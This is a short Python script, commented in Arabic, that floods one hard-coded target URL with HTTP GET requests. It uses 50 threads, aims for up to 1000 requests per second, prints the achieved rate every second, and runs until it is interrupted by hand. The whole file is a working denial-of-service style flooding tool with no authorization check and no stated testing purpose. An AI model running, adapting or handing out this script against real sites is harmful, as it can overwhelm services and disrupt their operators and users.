import requests
import threading
import time
import sys

# URL المستهدف
TARGET_URL = "https://dstat.countbot.uk/"

# الهدف: 1000 طلب في الثانية كحد أقصى
REQUESTS_PER_SECOND = 1000

# عدد الخيوط
NUM_THREADS = 50

# حساب الوقت بين كل طلب لكل خيط
DELAY_PER_REQUEST = 1 / (REQUESTS_PER_SECOND / NUM_THREADS)

# عداد لتتبع عدد الطلبات الناجحة
successful_requests = 0
lock = threading.Lock()

# متغير للتحكم في حالة التشغيل
running = True

def make_request(thread_id):
    """دالة لإرسال طلب HTTP"""
    global successful_requests
    while running:
        try:
            start_time = time.time()
            response = requests.get(TARGET_URL, timeout=5)
            
            with lock:
                successful_requests += 1
            
            elapsed = time.time() - start_time
            sleep_time = max(0, DELAY_PER_REQUEST - elapsed)
            time.sleep(sleep_time)
            
        except requests.exceptions.RequestException as e:
            print(f"خطأ في الخيط {thread_id}: {e}")
            time.sleep(1)  # تأخير قصير قبل المحاولة مجدداً

def monitor_rate():
    """دالة لمراقبة معدل الطلبات"""
    global successful_requests
    while running:
        time.sleep(1)
        with lock:
            rate = successful_requests
            successful_requests = 0
        print(f"معدل الطلبات في الثانية: {rate}")
        if rate > REQUESTS_PER_SECOND:
            print("تحذير: تجاوز معدل الطلبات المطلوب!")

def main():
    global running
    
    # إنشاء الخيوط
    threads = []
    for i in range(NUM_THREADS):
        t = threading.Thread(target=make_request, args=(i,), daemon=True)
        threads.append(t)
        t.start()

    # خيط لمراقبة المعدل
    monitor_thread = threading.Thread(target=monitor_rate, daemon=True)
    monitor_thread.start()

    # الاستمرار حتى يتم إيقاف البرنامج يدوياً
    try:
        print(f"بدء إرسال الطلبات إلى: {TARGET_URL}")
        print(f"الهدف: {REQUESTS_PER_SECOND} طلب/ثانية")
        print(f"عدد الخيوط: {NUM_THREADS}")
        print(f"التأخير بين الطلبات لكل خيط: {DELAY_PER_REQUEST:.4f} ثانية")
        while True:
            time.sleep(1)  # الانتظار مع تقليل استهلاك المعالج
            
    except KeyboardInterrupt:
        print("\nجارٍ إيقاف البرنامج...")
        running = False
        for t in threads:
            t.join(timeout=2)
        print("تم إيقاف البرنامج بنجاح")
        sys.exit(0)

if __name__ == "__main__":
    main()
